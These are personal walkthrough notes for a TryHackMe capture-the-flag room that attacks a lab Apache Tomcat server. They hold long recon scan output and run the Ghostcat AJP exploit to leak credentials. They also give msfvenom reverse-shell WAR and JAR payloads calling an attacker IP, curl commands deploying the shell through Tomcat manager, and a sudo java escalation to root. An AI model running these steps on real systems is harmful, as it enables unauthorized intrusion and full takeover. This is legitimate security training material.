
These are just the notes of me using writeup for this room to learn these were:
https://therennox.github.io/thm/vulnNetDotjar
https://musyokaian.medium.com/vulnnet-dotjar-tryhackme-walkthrough-12bb0021d89e

Name:  
Date:  
Difficulty:  
Description:  
Better Description:  
Goals:  
Learnt:

[therennox](https://therennox.github.io/thm/vulnNetDotjar)


## Recon

```
root@ip-10-10-254-124:~# ping -c 3 10.10.114.106
PING 10.10.114.106 (10.10.114.106) 56(84) bytes of data.
64 bytes from 10.10.114.106: icmp_seq=1 ttl=64 time=0.581 ms
64 bytes from 10.10.114.106: icmp_seq=2 ttl=64 time=0.376 ms
64 bytes from 10.10.114.106: icmp_seq=3 ttl=64 time=0.366 ms

--- 10.10.114.106 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2030ms
rtt min/avg/max/mdev = 0.366/0.441/0.581/0.099 ms
root@ip-10-10-254-124:~# nmap -sC -sV -p- 10.10.114.106 --min-rate 5000

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-08 10:18 BST
Nmap scan report for ip-10-10-114-106.eu-west-1.compute.internal (10.10.114.106)
Host is up (0.00099s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http    Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
MAC Address: 02:41:44:B6:95:B1 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.45 seconds
root@ip-10-10-254-124:~# nikto -h 10.10.114.106:8080 -C all
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.10.114.106
+ Target Hostname:    ip-10-10-114-106.eu-west-1.compute.internal
+ Target Port:        8080
+ Start Time:         2022-05-08 10:23:48 (GMT1)
---------------------------------------------------------------------------
+ Server: No banner retrieved
+ The anti-clickjacking X-Frame-Options header is not present.
+ Server leaks inodes via ETags, header found with file /favicon.ico, fields: 0xW/21630 0x1575737031000 
+ OSVDB-39272: favicon.ico file identifies this server as: Apache Tomcat
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /examples/servlets/index.html: Apache Tomcat default JSP pages present.
+ Cookie JSESSIONID created without the httponly flag
+ OSVDB-3720: /examples/jsp/snp/snoop.jsp: Displays information about page retrievals, including other users.
+ /manager/html: Default Tomcat Manager interface found
+ 6544 items checked: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2022-05-08 10:24:22 (GMT1) (34 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


root@ip-10-10-254-124:~# dirb http://10.10.114.106:8080

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun May  8 10:28:46 2022
URL_BASE: http://10.10.114.106:8080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.114.106:8080/ ----
+ http://10.10.114.106:8080/docs (CODE:302|SIZE:0)                             
+ http://10.10.114.106:8080/examples (CODE:302|SIZE:0)                         
+ http://10.10.114.106:8080/favicon.ico (CODE:200|SIZE:21630)                  
+ http://10.10.114.106:8080/host-manager (CODE:302|SIZE:0)                     
+ http://10.10.114.106:8080/manager (CODE:302|SIZE:0)                          
                                                                               
-----------------
END_TIME: Sun May  8 10:28:48 2022
DOWNLOADED: 4612 - FOUND: 5

root@ip-10-10-254-124:~# gobuster dir -u http://10.10.114.106:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x jar
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.114.106:8080/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     jar
[+] Timeout:        10s
===============================================================
2022/05/08 10:32:00 Starting gobuster
===============================================================
/docs (Status: 302)
/examples (Status: 302)
/manager (Status: 302)
===============================================================
2022/05/08 10:34:20 Finished
===============================================================

root@ip-10-10-254-124:~# nmap --script discovery -p 8009,8080 10.10.114.106 --min-rate 5000

Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-08 10:47 BST
Pre-scan script results:
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
Nmap scan report for ip-10-10-114-106.eu-west-1.compute.internal (10.10.114.106)
Host is up (0.00025s latency).

PORT     STATE SERVICE
8009/tcp open  ajp13
| ajp-headers: 
|_  Content-Type: text/html;charset=UTF-8
| ajp-request: 
| AJP/1.3 200 200
| Content-Type: text/html;charset=UTF-8
| 
| tps://tomcat.apache.org/taglibs/">Taglibs</a></li>
|                             <li><a href="/docs/deployer-howto.html">Deployer</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container">
|                         <h4>Other Documentation</h4>
|                         <ul>
|                             <li><a href="https://tomcat.apache.org/connectors-doc/">Tomcat Connectors</a></li>
|                             <li><a href="https://tomcat.apache.org/connectors-doc/">mod_jk Documentation</a></li>
|                             <li><a href="https://tomcat.apache.org/native-doc/">Tomcat Native</a></li>
|                             <li><a href="/docs/deployer-howto.html">Deployer</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container">
|                         <h4>Get Involved</h4>
|                         <ul>
|                             <li><a href="https://tomcat.apache.org/getinvolved.html">Overview</a></li>
|                             <li><a href="https://tomcat.apache.org/source.html">Source Repositories</a></li>
|                             <li><a href="https://tomcat.apache.org/lists.html">Mailing Lists</a></li>
|                             <li><a href="https://wiki.apache.org/tomcat/FrontPage">Wiki</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container">
|                         <h4>Miscellaneous</h4>
|                         <ul>
|                             <li><a href="https://tomcat.apache.org/contact.html">Contact</a></li>
|                             <li><a href="https://tomcat.apache.org/legal.html">Legal</a></li>
|                             <li><a href="https://www.apache.org/foundation/sponsorship.html">Sponsorship</a></li>
|                             <li><a href="https://www.apache.org/foundation/thanks.html">Thanks</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <div class="col20">
|                     <div class="container">
|                         <h4>Apache Software Foundation</h4>
|                         <ul>
|                             <li><a href="https://tomcat.apache.org/whoweare.html">Who We Are</a></li>
|                             <li><a href="https://tomcat.apache.org/heritage.html">Heritage</a></li>
|                             <li><a href="https://www.apache.org">Apache Home</a></li>
|                             <li><a href="https://tomcat.apache.org/resources.html">Resources</a></li>
|                         </ul>
|                     </div>
|                 </div>
|                 <br class="separator" />
|             </div>
|             <p class="copyright">Copyright &copy;1999-2022 Apache Software Foundation.  All Rights Reserved</p>
|         </div>
|     </body>
| 
|_</html>
8080/tcp open  http-proxy
| http-auth-finder: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=ip-10-10-114-106.eu-west-1.compute.internal
|   url                                                                        method
|   http://ip-10-10-114-106.eu-west-1.compute.internal:8080/host-manager/html  HTTP: Basic
|   http://ip-10-10-114-106.eu-west-1.compute.internal:8080/manager/status     HTTP: Basic
|_  http://ip-10-10-114-106.eu-west-1.compute.internal:8080/manager/html       HTTP: Basic
|_http-chrono: Request times for /; avg: 212.02ms; min: 170.92ms; max: 260.76ms
|_http-date: Sun, 08 May 2022 09:47:47 GMT; 0s from local time.
| http-enum: 
|   /examples/: Sample scripts
|   /manager/html/upload: Apache Tomcat (401 )
|   /manager/html: Apache Tomcat (401 )
|_  /docs/: Potentially interesting folder
|_http-favicon: Apache Tomcat
| http-grep: 
|   (2) http://ip-10-10-114-106.eu-west-1.compute.internal:8080/docs/realm-howto.html: 
|     (2) email: 
|       + j.jones@mycompany.com
|       + f.bloggs@mycompany.com
|   (1) http://ip-10-10-114-106.eu-west-1.compute.internal:8080/docs/appdev/: 
|     (1) email: 
|_      + craigmcc@apache.org
| http-headers: 
|   Content-Type: text/html;charset=UTF-8
|   Transfer-Encoding: chunked
|   Date: Sun, 08 May 2022 09:47:46 GMT
|   Connection: close
|   
|_  (Request type: HEAD)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat/9.0.30
| http-vhosts: 
|_127 names had status 200
| http-waf-detect: IDS/IPS/WAF detected:
|_ip-10-10-114-106.eu-west-1.compute.internal:8080/?p4yl04d3=<script>alert(document.cookie)</script>
MAC Address: 02:41:44:B6:95:B1 (Unknown)

Host script results:
| dns-brute: 
|   DNS Brute-force hostnames: 
|_    ns0.eu-west-1.compute.internal - 172.16.0.23
|_fcrdns: PASS (ip-10-10-114-106.eu-west-1.compute.internal)
|_ipidseq: All zeros
|_path-mtu: PMTU == 9001
| qscan: 
| PORT  FAMILY  MEAN (us)  STDDEV  LOSS (%)
| 8009  0       387.00     -nan    90.0%
|_8080  1       448.40     73.94   0.0%
|_sniffer-detect: Unknown (tests: "________")

Nmap done: 1 IP address (1 host up) scanned in 34.83 seconds

```

## Exploit

root@ip-10-10-254-124:~# searchsploit ajp
----------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                         |  Path
----------------------------------------------------------------------- ---------------------------------
AjPortal2Php - 'PagePrefix' Remote File Inclusion                      | php/webapps/3752.txt
Apache Tomcat - AJP 'Ghostcat File Read/Inclusion                      | multiple/webapps/48143.py
----------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

root@ip-10-10-254-124:~# python2 48143.py 10.10.114.106 
Getting resource at ajp13://10.10.114.106:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>VulnNet Entertainment</display-name>
  <description>
     VulnNet Dev Regulations - mandatory
 
1. Every VulnNet Entertainment dev is obligated to follow the rules described herein according to the contract you signed.
2. Every web application you develop and its source code stays here and is not subject to unauthorized self-publication.
-- Your work will be reviewed by our web experts and depending on the results and the company needs a process of implementation might start.
-- Your project scope is written in the contract.
3. Developer access is granted with the credentials provided below:
 
    webdev:Hgj3LA$02D$Fa@21
 
GUI access is disabled for security reasons.
 
4. All further instructions are delivered to your business mail address.
5. If you have any additional questions contact our staff help branch.
  </description>

</web-app>
```
With these credentials we can get to /manager/, upload a shell and execute it.

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.254.124 LPORT=1337 -f war -o shell.war
curl -u 'webdev:Hgj3LA$02D$Fa@21' --upload-file shell.war "http://10.10.114.106:8080/manager/text/deploy?path=/shell"
cat shell.war
curl -u 'webdev:Hgj3LA$02D$Fa@21' "http://10.10.114.106:8080/shell/vyxvzwlmsrcic.jsp"
```

Script will show
in /var/backups
-rw-r--r--  1 root root       485 Jan 16  2021 shadow-backup-alt.gz
is readable.

$6$PQQxGZw5$fSSXp2EcFX0RNNOcu6uakkFjKDDWGw1H35uvQzaH44.I/5cwM0KsRpwIp8OcsOeQcmXJeJAk7SnwY6wV8A0z/1:794613852

su jdk-admin


```bash
jdk-admin@vulnnet-dotjar:/tmp$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password: 
Matching Defaults entries for jdk-admin on vulnnet-dotjar:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jdk-admin may run the following commands on vulnnet-dotjar:
    (root) /usr/bin/java -jar *.jar

msfvenom --platform java -p java/shell_reverse_tcp LHOST=$IP LPORT=$PORT -f jar -o rev.jar

addded the --platform java which help from:

https://m3n0sd0n4ld.github.io/thm/VulnNet-dotjar/
